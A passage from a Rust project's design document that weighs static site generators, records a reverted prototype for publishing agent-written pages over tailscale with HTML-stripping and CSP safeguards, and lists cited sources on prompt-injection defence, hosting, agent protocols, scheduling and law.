handful of markdown files with no navigation structure, no versioning need and
no i18n. The repository is Rust with no JavaScript toolchain, so Docusaurus,
Starlight and VitePress all mean adopting npm to publish them. **Zola or mdBook
cost one static binary and nothing else**, mdBook is what a Rust reader expects
a Rust project's handbook to look like, and GitHub Pages hosts either free —
which is fine *here* precisely because the docs are public and need no CSP.

One line from the survey worth keeping whatever gets picked: **switching
generators after a year costs roughly ten times what adopting one costs.**
Which argues for choosing on ecosystem fit rather than today's feature
comparison — and mecha's ecosystem is Rust.

---

## For the record: a prototype that was written and reverted

The most useful kind of negative result. During the artifact session a
prototype of the store, the markdown-to-HTML renderer and a trigger writing its
briefing as an artifact **was** written and then deliberately reverted, along
with the generated `~/.mecha/site`. What it demonstrated before it went:

- The whole producing half is small — a store, a renderer and a rebuild, with
  the tests that matter being the injection ones (raw HTML stripped from
  agent-authored markdown, titles escaped, CSP on every page).
- **`tailscale serve <directory>` really does remove the server entirely**, and
  the tailnet already spans the machine, a laptop and a phone.
- The interesting cost is not the code. It is deciding the audience, the
  origin, and who may read a summary of somebody's inbox — which is what the
  rest of this document is about.

---

## Sources

### Security and prompt injection

- [Design Patterns for Securing LLM Agents against Prompt Injections (arXiv:2506.08837)](https://arxiv.org/abs/2506.08837)
- [Design Patterns for Securing LLM Agents — Simon Willison's notes](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- [CaMeL offers a promising new direction for mitigating prompt injection attacks](https://simonwillison.net/2025/Apr/11/camel/)
- [How Google DeepMind's CaMeL Architecture Aims to Block LLM Prompt Injections](https://winbuzzer.com/2025/04/27/how-google-deepminds-camel-architecture-aims-to-block-llm-prompt-injections-xcxwbn/)
- [LLM01:2025 Prompt Injection — OWASP GenAI](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [Decoding Latent Attack Surfaces in LLMs: Prompt Injection via HTML in Web Summarization (arXiv:2509.05831)](https://arxiv.org/pdf/2509.05831)
- [Exploiting Web Search Tools of AI Agents for Data Exfiltration (arXiv:2510.09093)](https://arxiv.org/pdf/2510.09093)
- [Agentic AI security: prompt injection and the defense stack, 2026](https://zylos.ai/research/2026-05-16-agentic-ai-security-prompt-injection-defense-stack/)
- [Web-based indirect prompt injection observed in the wild — Unit 42](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)

### Origins, CSP, hosting

- [Securely hosting user data in modern web applications — web.dev](https://web.dev/articles/securely-hosting-user-data)
- [Same-origin policy — MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy)
- [Making your website cross-origin isolated using COOP and COEP — web.dev](https://web.dev/articles/coop-coep)
- [No way to use WebAssembly on Chrome without 'unsafe-eval' — WebAssembly/content-security-policy#7](https://github.com/WebAssembly/content-security-policy/issues/7)
- [`wasm-unsafe-eval` browser support — caniuse](https://caniuse.com/?search=wasm-unsafe-eval)
- [Support `wasm-unsafe-eval` CSP directive to enable WebAssembly in MCP Apps](https://github.com/modelcontextprotocol/ext-apps/issues/605)
- [Good Practices for Capability URLs — W3C TAG](https://w3ctag.github.io/capability-urls/)
- [Public Suffix List — submission guidelines](https://github.com/publicsuffix/list/wiki/guidelines)
- [Add *.usercontent.goog — publicsuffix/list PR #1417](https://github.com/publicsuffix/list/pull/1417)
- [rrsync(1) manual page](https://man7.org/linux/man-pages/man1/rrsync.1.html)
- [Secure file transfer deployments with restricted SSH keys and rsync](https://awmb.uk/2021/06/rrsync)
- [Cloudflare Workers pricing and limits](https://developers.cloudflare.com/workers/platform/pricing/)
- [Cloudflare Pages vs Workers 2026: migration, pricing, free plan](https://cogley.jp/articles/cloudflare-pages-to-workers-migration)
- [Pangolin vs Cloudflare Tunnels vs Tailscale: which should you self-host?](https://contabo.com/blog/pangolin-vs-cloudflare-tunnels-vs-tailscale/)
- [Tailscale Serve documentation](https://tailscale.com/docs/features/tailscale-serve)
- [Tailscale Funnel documentation](https://tailscale.com/docs/features/tailscale-funnel)
- [Tailscale identity — identity headers on proxied requests](https://tailscale.com/docs/concepts/tailscale-identity)
- [Do not trust `Tailscale-User-Login` from arbitrary loopback proxies](https://github.com/denoland/clawpatrol/issues/316)
- [Password protection for Cloudflare Pages](https://dev.to/charca/password-protection-for-cloudflare-pages-8ma)

### Artifacts and prior art

- [Claude Code artifacts: publish, plans, private sharing — Stacktree](https://stacktr.ee/blog/artifacts-in-claude-code-explained)
- [Claude Code Artifacts: Ship a Coding Session as a Page](https://www.digitalapplied.com/blog/claude-code-shareable-artifacts-live-web-pages-2026)
- [AI Agent Artifact Sharing Compared: Claude, Cursor, Codex (2026) — Markloop](https://markloop.io/blog/claude-artifact-sharing-compared/)
- [deploybase MCP server (Apache 2.0)](https://codeberg.org/deploybase/mcp-server)

### Schemas, forms, agent-facing surfaces

- [Using JSON Schema at Remote to scale forms and data validations](https://json-schema.org/blog/posts/remote-case-study)
- [Stop fighting forms: the schema-driven approach to validation — LogRocket](https://blog.logrocket.com/stop-fighting-schema-driven-form-validation/)
- [WebMCP Tutorial: Building Agent-Ready Websites With Chrome's New Standard — DataCamp](https://www.datacamp.com/tutorial/webmcp-tutorial)
- [WebMCP: Google's Browser Standard That Lets AI Agents Use Websites as Tools](https://www.developersdigest.tech/blog/webmcp-google-browser-agent-standard-2026)
- [What Is WebMCP? Your Website's API for AI Agents](https://nohacks.co/blog/what-is-webmcp)
- [Agent2Agent (A2A) Protocol specification](https://a2a-protocol.org/latest/specification/)
- [A2A Agent Discovery — well-known agent card](https://a2a-protocol.org/latest/topics/agent-discovery/)
- [A2A Agent Card schema reference (v1.0)](https://www.agentcard.net/agent-card-schema)
- [Governance Gaps in Agent Interoperability Protocols (arXiv:2606.31498)](https://arxiv.org/pdf/2606.31498)
- [MCP Apps: Extending servers with interactive user interfaces](https://blog.modelcontextprotocol.io/posts/2025-11-21-mcp-apps/)
- [MCP Apps Now Official — Bringing UI Capabilities to MCP Clients](https://blog.modelcontextprotocol.io/posts/2026-01-26-mcp-apps/)
- [mcp-ui — UI over MCP](https://mcpui.dev/)
- [MCP Resources vs Tools](https://www.mcpforge.tech/blog/mcp-resources-vs-tools)
- [What Are MCP Resources? (And When to Use Them)](https://apigene.ai/blog/mcp-resources)
- [llms.txt adoption rises 8.8x but 97% of files get zero AI requests](https://ppc.land/llms-txt-adoption-rises-8-8x-but-97-of-files-get-zero-ai-requests/)
- [The State of llms.txt in 2026](https://ai.aeo.press/the-state-of-llms-txt-in-2026)

### Notebooks and publishing

- [marimo — Self-host WebAssembly notebooks](https://docs.marimo.io/guides/publishing/self_host_wasm/)
- [marimo — WebAssembly HTML export](https://docs.marimo.io/guides/exporting/webassembly_html/)
- [marimo islands — island example](https://github.com/marimo-team/marimo/blob/main/docs/guides/island_example.md?plain=true)
- [marimo — Quarto integration](https://docs.marimo.io/guides/publishing/quarto/)
- [Zensical — a modern static site generator (Material for MkDocs team)](https://squidfunk.github.io/mkdocs-material/blog/2025/11/05/zensical/)
- [Zensical compatibility and roadmap](https://zensical.org/compatibility/)
- [Static Site Generators 2026 Head-to-Head](https://www.youngju.dev/blog/culture/2026-05-14-static-site-generators-2026-hugo-eleventy-astro-mkdocs-docusaurus-mintlify-starlight-comparison-deep-dive.en)
- [Starlight vs Docusaurus — LogRocket](https://blog.logrocket.com/starlight-vs-docusaurus-building-documentation/)

### Scheduling

- [CalBench: Evaluating Coordination–Privacy Trade-offs in Multi-Agent LLMs (arXiv:2605.09823)](https://arxiv.org/html/2605.09823)
- [Multi-User Large Language Model Agents (arXiv:2604.08567)](https://arxiv.org/pdf/2604.08567)
- [GroupTravelBench (arXiv:2605.25200)](https://arxiv.org/html/2605.25200)
- [RFC 7953 — Calendar Availability](https://www.rfc-editor.org/rfc/rfc7953.html)
- [Microsoft Graph: get free/busy schedule (`getSchedule`)](https://learn.microsoft.com/en-us/graph/outlook-get-free-busy-schedule)
- [Google Calendar API: Freebusy](https://developers.google.com/workspace/calendar/api/v3/reference/freebusy)
- [Cal.rs — self-hostable scheduling in Rust](https://cal.rs/)
- [Cal.com self-hosting and API](https://dev.to/0012303/calcom-has-a-free-api-open-source-scheduling-that-replaces-calendly-nim)
- [Modeling booking/reservation systems (holds, TTLs, atomic claims)](https://oneuptime.com/blog/post/2026-03-31-redis-how-to-model-bookingreservation-systems-in-redis/view)
- [Testing Amy: appointments scheduled by an AI assistant](https://www.geekwire.com/2015/testing-amy-what-its-like-to-have-appointments-scheduled-by-an-ai-assistant/)
- [Why autonomous email negotiations don't work](https://medium.com/@fabioherle/the-no-friction-myth-of-autonomous-email-negotiations-2d0ee5994b77)
- [AI in negotiation: seven lessons (PON, Harvard Law)](https://www.pon.harvard.edu/daily/negotiation-skills-daily/ai-in-negotiation-seven-lessons/)

### Review queues, structured output, verification, abuse

- [The Approval Queue Pattern: Human-in-the-Loop for AI Agents](https://eucalipse.com/articles/ai-agent-approval-queue-human-in-the-loop)
- [Human-in-the-Loop Patterns for AI Agents (2026)](https://myengineeringpath.dev/genai-engineer/human-in-the-loop/)
- [Human-in-the-loop patterns — Cloudflare Agents docs](https://developers.cloudflare.com/agents/concepts/agentic-patterns/human-in-the-loop/)
- [When Correct Isn't Usable: Improving Structured Output Reliability in Small Language Models (arXiv:2605.02363)](https://arxiv.org/html/2605.02363v1)
- [Capacity, Not Format: Rethinking Structured Reasoning Failures (arXiv:2606.09410)](https://arxiv.org/pdf/2606.09410)
- [Structured Output Reliability in Production: Why JSON Mode Is Not a Contract](https://tianpan.co/blog/2026-04-20-structured-output-reliability-production)
- [Are Magic Links Secure: A Technical Deep Dive Into Email Based Authentication](https://securityboulevard.com/2026/05/are-magic-links-secure-a-technical-deep-dive-into-email-based-authentication/)
- [OTP vs Magic link: choosing the right passwordless method](https://www.scalekit.com/blog/otp-vs-magic-links-passwordless-authentication)
- [Cloudflare Turnstile — invisible bot protection](https://developers.cloudflare.com/turnstile/)
- [Best CAPTCHA alternatives 2026 — Cap (self-hosted proof-of-work)](https://trycap.dev/guide/best-captcha-alternatives)
- [Conversational forms vs traditional forms — 2026 data](https://tinycommand.com/blogs/conversational-forms-vs-traditional-forms-which-is-better-for-your-business)
- [The science behind conversational form completion rates](https://gnosari.com/blog/conversational-completion-rates)

### Law, policy, ethics

- [Moffatt v. Air Canada: A Misrepresentation by an AI Chatbot — McCarthy Tétrault](https://www.mccarthy.ca/en/insights/blogs/techlex/moffatt-v-air-canada-misrepresentation-ai-chatbot)
- [BC Tribunal Confirms Companies Remain Liable for Information Provided by AI Chatbot — ABA](https://www.americanbar.org/groups/business_law/resources/business-law-today/2024-february/bc-tribunal-confirms-companies-remain-liable-information-provided-ai-chatbot/)
- [Air Canada's chatbot illustrates persistent agency and responsibility gap problems for AI — AI & Society](https://link.springer.com/article/10.1007/s00146-024-02096-7)
- [Assessing the performance of 8 AI chatbots in bibliographic reference retrieval (arXiv:2505.18059)](https://arxiv.org/pdf/2505.18059)
- [Citation hallucinations — Emergent Mind](https://www.emergentmind.com/topics/citation-hallucinations)
- [Preparing for April 2026 — New Digital Accessibility Standards for Public Institutions of Higher Education (Duane Morris)](https://www.duanemorris.com/alerts/preparing_for_april_2026_new_digital_accessibility_standards_public_institutions_higher_0326.html)
- [A Guide to the ADA Title II Accessibility Rule: deadline extended](https://edtechmagazine.com/higher/article/2025/06/guide-ada-title-ii-accessibility-rule-perfcon)
- [ADA Title II requirements for higher education websites (2026)](https://www.audioeye.com/post/title-ii-requirements-higher-education/)
- [FERPA rules for student recommendations — Hamilton College](https://www.hamilton.edu/offices/registrar/for-faculty/ferpa-rules-for-student-recommendations)
- [FERPA and recommendation letters: navigating consent and access](https://govfacts.org/government/federal/agencies/ed/ferpa-and-recommendation-letters-navigating-consent-and-access/)
- [GDPR for small businesses: a guide to compliance in 2026](https://www.dpo-consulting.com/blog/gdpr-small-business)
- [Data protection for websites 2026: the 6 most important GDPR rules](https://raidboxes.io/en/blog/security/data-privacy-websites/)
- [Digital clones: the rise of AI cloning and the ethics of our digital twins](https://www.fabrixai.com/blog/digital-clones-the-rise-of-ai-cloning-and-the-ethics-of-our-digital-twins)
- [Digital Doppelgangers: Ethical and Societal Implications of Pre-Mortem AI Clones (arXiv:2502.21248)](https://arxiv.org/pdf/2502.21248)
